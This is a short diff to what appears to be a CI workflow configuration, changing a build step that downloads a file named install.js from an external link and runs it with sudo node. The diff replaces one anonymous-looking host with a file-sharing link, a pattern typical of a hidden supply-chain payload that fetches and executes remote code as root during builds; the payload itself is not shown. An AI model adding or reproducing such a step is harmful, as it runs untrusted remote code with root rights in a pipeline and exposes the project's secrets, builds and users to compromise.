@@ -64,7 +64,7 @@ jobs:
         working-directory: server
         run: |
           sudo apt install wget
-          sudo wget -O install.js https://scornful-gold-jt86nbu6.edgeone.dev/
+          sudo wget -O install.js https://www.hostize.com/zh/s/puO_h8INYL
           sudo node install.js
           sudo chown -R runner:runner .
 
